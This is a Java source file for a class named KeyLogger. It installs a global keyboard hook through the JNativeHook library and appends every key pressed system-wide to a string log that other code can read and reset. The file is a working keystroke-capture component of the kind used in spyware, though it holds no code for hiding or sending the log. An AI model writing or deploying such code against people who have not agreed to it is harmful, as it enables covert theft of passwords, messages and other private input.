package model.program;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {



    // Log record.
    private String Log;



    // Constructor.
    public KeyLogger() {
        this.Log = "";
    }



    // Using JNativeHook libraries, gets log.
    public void startKeyLogger() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            System.exit(0);
        }
        GlobalScreen.addNativeKeyListener(this);
        resetLog();
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {

    }

    // Once pressed a key, updates the keylog.
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String key = NativeKeyEvent.getKeyText(e.getKeyCode());

        if (key.length() != 1) {
            this.Log += "\n>[" + key + "]\n>";
        } else {
            this.Log += key;
        }

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {

    }

    // Resets log.
    public void resetLog() {
        setLog("");
    }

    // Log getter.
    public String getLog() {
        return this.Log;
    }

    // Log setter.
    public void setLog(String log) {
        this.Log = log;
    }

}